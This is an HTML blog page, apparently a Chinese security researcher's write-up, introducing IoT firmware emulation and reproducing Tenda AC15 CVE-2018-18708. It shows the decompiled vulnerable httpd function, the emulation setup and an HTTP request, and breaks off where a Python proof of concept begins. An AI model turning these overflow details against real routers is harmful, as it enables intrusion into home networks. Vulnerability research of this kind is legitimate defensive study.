@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="IoT简易入门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tenda-cve">
+<meta property="og:url" content="https://ha0-y.github.io/2024/03/21/Tenda-CVE/index.html">
+<meta property="og:site_name" content="h4m5ter">
+<meta property="og:description" content="IoT简易入门">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-29T09:36:00.603Z">
+<meta property="article:author" content="h4m5ter">
+<meta property="article:tag" content="IoT">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tenda-cve</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/25/afl-fuzz/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/20/DubheCTF-ggbond/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/03/21/Tenda-CVE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&text=Tenda-cve"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&is_video=false&description=Tenda-cve"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tenda-cve&body=Check out this article: https://ha0-y.github.io/2024/03/21/Tenda-CVE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&name=Tenda-cve&description=&lt;blockquote&gt;
+&lt;p&gt;IoT简易入门&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&t=Tenda-cve"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85"><span class="toc-number">1.1.</span> <span class="toc-text">固件解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BF%E7%9C%9F"><span class="toc-number">1.2.</span> <span class="toc-text">仿真</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#qemu-user"><span class="toc-number">1.2.1.</span> <span class="toc-text">qemu-user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qemu-system"><span class="toc-number">1.2.2.</span> <span class="toc-text">qemu-system</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E7%BD%91%E6%A1%A5"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">搭建网桥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#chroot"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">chroot</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FAT"><span class="toc-number">1.2.3.</span> <span class="toc-text">FAT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unicorn"><span class="toc-number">1.2.4.</span> <span class="toc-text">Unicorn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Qiling"><span class="toc-number">1.2.5.</span> <span class="toc-text">Qiling</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91ghidra"><span class="toc-number">2.</span> <span class="toc-text">编译ghidra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9B%BA%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">获取固件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA-plugins"><span class="toc-number">4.</span> <span class="toc-text">IDA plugins</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tenda"><span class="toc-number">5.</span> <span class="toc-text">tenda</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-18708"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2018-18708</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-27021"><span class="toc-number">5.2.</span> <span class="toc-text">CVE-2023-27021</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95"><span class="toc-number">5.3.</span> <span class="toc-text">尝试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#more"><span class="toc-number">6.</span> <span class="toc-text">more</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Tenda-cve
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">h4m5ter</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-20T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-03-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categorievariants/CSE/">CSE</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/IoT/" rel="tag">IoT</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>IoT简易入门</p>
+</blockquote>
+<span id="more"></span>
+
+<p>复现，有了经验后尝试挖掘</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h3><p><a target="_blank" rel="noopener" href="https://github.com/ReFirmLabs/binwalk">binwalk</a>: 可以分析并且解包</p>
+<p>没有加密，因此可以使用binwalk解包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -e, --extract                Automatically extract known file types</span></span><br><span class="line"><span class="comment"># -M, --matryoshka             Recursively scan extracted files</span></span><br><span class="line"><span class="comment"># 也就是递归解包</span></span><br><span class="line">$ binwalk -Me xxx.bin</span><br></pre></td></tr></table></figure>
+
+<h3 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h3><p>有资金可以买个设备，效果更好。没资金的就虚拟运行</p>
+<p>主要参考：<a target="_blank" rel="noopener" href="https://github.com/SecureNexusLab/IoTFirmwareAnalysisGuide/blob/main/GuideTutorial/3-%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F.md">固件仿真</a></p>
+<h4 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu-user"></a>qemu-user</h4><p>下载静态编译的qemu-user，避免某些动态链接库导致运行错误</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure>
+
+<h4 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h4><p>QEMU-System是QEMU项目的一部分，它提供了完整的虚拟化和仿真环境，允许用户模拟整个计算机系统，包括CPU、内存、外部设备等。QEMU-System是一种强大的工具，可用于多种用途，包括虚拟化、操作系统开发、嵌入式系统测试和仿真等。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install qemu-system</span><br></pre></td></tr></table></figure>
+
+<h5 id="搭建网桥"><a href="#搭建网桥" class="headerlink" title="搭建网桥"></a>搭建网桥</h5><p>bridge是一个虚拟网络设备，所以具有网络设备的特征，可以配置IP、MAC地址等；其次，bridge是一个虚拟交换机，和物理交换机有类似的功能。</p>
+<p>添加一个虚拟网桥并且获得IP地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install uml-utilities bridge-utils net-tools</span><br><span class="line"><span class="comment"># 添加一个网桥</span></span><br><span class="line">$ sudo brctl addbr br0</span><br><span class="line"><span class="comment"># add interface</span></span><br><span class="line">$ sudo brctl addif br0 eth0</span><br><span class="line"><span class="comment"># 网桥 up</span></span><br><span class="line">$ sudo ifconfig br0 up</span><br><span class="line"><span class="comment"># dhcp 获得IP</span></span><br><span class="line">$ sudo dhclient br0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除网桥</span></span><br><span class="line">$ sudo ifconfig br0 down         </span><br><span class="line">$ sudo brctl delbr br0</span><br></pre></td></tr></table></figure>
+
+<p>iproute2: <a target="_blank" rel="noopener" href="https://linux.cn/article-4326-1.html">iproute2 对决 net-tools</a>，现在大部分linux默认安装这个工具而不是net-tools</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://wiki.archlinux.org/title/Network_bridge">ArchWiki</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建一个网桥</span></span><br><span class="line">$ sudo ip <span class="built_in">link</span> add name br0 <span class="built_in">type</span> bridge</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> dev br0 up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将网卡加入/删除网桥</span></span><br><span class="line"><span class="comment"># 想要添加Interface到网桥上，interface状态必须是Up</span></span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 master br0</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 nomaster</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置ip地址,需要结合自己的网关等进行设置</span></span><br><span class="line"><span class="comment"># IP address attached to eth1: 10.2.3.4/8</span></span><br><span class="line">$ sudo ip address add 10.2.3.4/8 dev br0</span><br></pre></td></tr></table></figure>
+
+<p>tun网卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ip tuntap add dev tap0 mod tap <span class="comment"># 创建 tap </span></span><br><span class="line">$ ip tuntap add dev tun0 mod tun <span class="comment"># 创建 tun</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="chroot"><a href="#chroot" class="headerlink" title="chroot"></a>chroot</h5><p>首先，可以在<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu">aurel32&#x2F;qemu</a>下载qemu-system所需的文件</p>
+<ul>
+<li>kernel: zImage 格式压缩的 linux kernel</li>
+<li>inited: ramdisk 镜像</li>
+<li>drive: 文件系统镜像</li>
+<li>主要是net，设置为我们设置的网桥</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm \</span><br><span class="line">	-M vexpress-a9 \</span><br><span class="line">	-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">	-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">	-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">	-append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">	-net nic \</span><br><span class="line">	-net tap,ifname=br0,script=no,downscript=no \</span><br><span class="line">	-nographic</span><br></pre></td></tr></table></figure>
+
+<h4 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h4><p><a target="_blank" rel="noopener" href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a>: 依赖<a target="_blank" rel="noopener" href="https://github.com/firmadyne/firmadyne">firmadyne</a>进行模拟</p>
+<p>安装，会安装binwalk，并且和之前的冲突</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit</span><br><span class="line">$ <span class="built_in">cd</span> firmware-analysis-toolkit</span><br><span class="line">$ ./setup.sh</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fat.py xxx.bin</span><br></pre></td></tr></table></figure>
+
+<h4 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h4><p>Unicorn 是一个 CPU 模拟器，</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/unicorn-engine/unicorn">unicorn: Unicorn CPU emulator framework (ARM, AArch64, M68K, Mips, Sparc, PowerPC, RiscV, S390x, TriCore, X86) </a></p>
+<h4 id="Qiling"><a href="#Qiling" class="headerlink" title="Qiling"></a>Qiling</h4><p>qiling由Unicorn引擎支持。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/qilingframework/qiling">qiling: A True Instrumentable Binary Emulation Framework</a></p>
+<p>源码或者docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/qilingframework/qiling</span><br><span class="line"><span class="comment"># 文件系统</span></span><br><span class="line">$ <span class="built_in">cd</span> qiling &amp;&amp; git submodule update --init --recursive pip3 install .</span><br><span class="line">$ pip3 install .</span><br></pre></td></tr></table></figure>
+
+<h2 id="编译ghidra"><a href="#编译ghidra" class="headerlink" title="编译ghidra"></a>编译ghidra</h2><p>mips反编译下ghidra更好用</p>
+<p>Linux可以使用包管理器下载，windows也可以直接下载release里的内容。</p>
+<p>编译结果在<code>build/dist/</code>，是一个压缩包，这样每次更新就重新编译，不用每次更新下载release了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; gradle -I gradle/support/fetchDependencies.gradle init</span><br><span class="line">PS&gt; gradle buildGhidra</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取固件"><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h2><p><a target="_blank" rel="noopener" href="https://github.com/re1wn/IoT-fstm/blob/main/IoT-project/%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97.md">物联网设备固件分析指南</a></p>
+<ol>
+<li>硬件：飞线，拆芯片，uart串口</li>
+<li>网络抓包：更新包时会请求并且下载</li>
+<li>官网：官网提供下载</li>
+<li>伸手党：问认识的大佬要😋</li>
+</ol>
+<h2 id="IDA-plugins"><a href="#IDA-plugins" class="headerlink" title="IDA plugins"></a>IDA plugins</h2><p>历年比较好的IDA插件，改url后面的年份查看：<a target="_blank" rel="noopener" href="https://hex-rays.com/contests_details/contest2023/">Plug-In Contest</a></p>
+<p>也可以自己开发</p>
+<h2 id="tenda"><a href="#tenda" class="headerlink" title="tenda"></a>tenda</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.tenda.com.cn/download/default.html">资料下载_腾达官方网站</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.tendacn.com/download/default.html">Download_Tenda-All For Better NetWorking</a></li>
+</ul>
+<h3 id="CVE-2018-18708"><a href="#CVE-2018-18708" class="headerlink" title="CVE-2018-18708"></a>CVE-2018-18708</h3><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.xmcve.com/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Tenda CVE-2018-18708 漏洞复现</a></p>
+<p>固件: <a target="_blank" rel="noopener" href="https://www.tenda.com.cn/download/detail-2680.html">AC15 V15.03.05.19</a></p>
+<p>漏洞存在于bin&#x2F;httpd：路由器的web服务器——httpd中的一个缓冲区溢出漏洞。 在处理 post 请求的函数<code>fromAddressNat</code>的<code>page</code>参数时，该值直接在 sprintf 中用于放置在堆栈上的局部变量，这会覆盖函数的返回地址。</p>
+<p>直接看反编译代码，<code>entrys</code> <code>mitInterface</code> <code>page</code>三个参数用户可控，page会被sprintf拼接到v6中， 并没有对大小进行检查，导致了栈溢出漏洞</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">fromAddressNat</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [sp+14h] [bp-418h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [sp+114h] [bp-318h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+314h] [bp-118h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// [sp+414h] [bp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [sp+418h] [bp-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// [sp+41Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="built_in">sizeof</span>(v4));</span><br><span class="line">  v9 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;entrys&quot;</span>, &amp;unk_E5D48);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;mitInterface&quot;</span>, &amp;unk_E5D48);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%s;%s&quot;</span>, v9, v8);</span><br><span class="line">  <span class="built_in">sub_4EC58</span>(<span class="string">&quot;adv.addrnat&quot;</span>, s, <span class="number">126</span>);</span><br><span class="line">  v7 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;page&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  v1 = <span class="built_in">sprintf</span>(v6, <span class="string">&quot;advance/addressNatList.asp?page=%s&quot;</span>, v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">CommitCfm</span>(v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(v4, <span class="string">&quot;advance_type=%d&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">send_msg_to_netctrl</span>(<span class="number">5</span>, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_2BE4C</span>(a1, v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>交叉引用寻找到，推测是注册路由的地方，我们可以从这入手挖洞</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_42378</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;GetStaticRouteCfg&quot;</span>, formGetRouteStatic);</span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;SetStaticRouteCfg&quot;</span>, fromSetRouteStatic);</span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;addressNat&quot;</span>, fromAddressNat);</span><br><span class="line">  <span class="built_in">sub_10120</span>(<span class="string">&quot;mNatGetStatic&quot;</span>, mNatGetStatic);</span><br><span class="line">  <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
+
+<p>然后运行http服务。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp $(which qemu-arm-<span class="type">static</span>) .</span><br><span class="line">$ sudo chroot . ./qemu-arm-<span class="type">static</span> bin/httpd</span><br></pre></td></tr></table></figure>
+
+<p>然后对着参考文章进行patch，或者配置网桥</p>
+<p>配置网桥，至于网桥名称为什么是br0：<a target="_blank" rel="noopener" href="https://blog.csdn.net/song_lee/article/details/113800058">Tenda AC15 路由器漏洞分析与复现</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> add br0 <span class="built_in">type</span> bridge</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 br0 master</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> br0 up</span><br><span class="line">sudo ip addr add dev br0 192.168.85.200/24 </span><br></pre></td></tr></table></figure>
+
+<p>cfm fail: patch一下</p>
+<ul>
+<li>问题解决：<a target="_blank" rel="noopener" href="https://blog.csdn.net/FigBB/article/details/134856961">ida pro使用Apply patches to保存修改时提示patching canceled..解决方法</a></li>
+</ul>
+<p>Cookie: password&#x3D;是必要的，后面的值可以随便填</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /main.html HTTP/1.1</span><br><span class="line">Host: 192.168.85.131</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: password=hamster</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: </span><br></pre></td></tr></table></figure>
+
+<p>使用给出PoC导致segment fault，将IP改了，其余不重要</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> 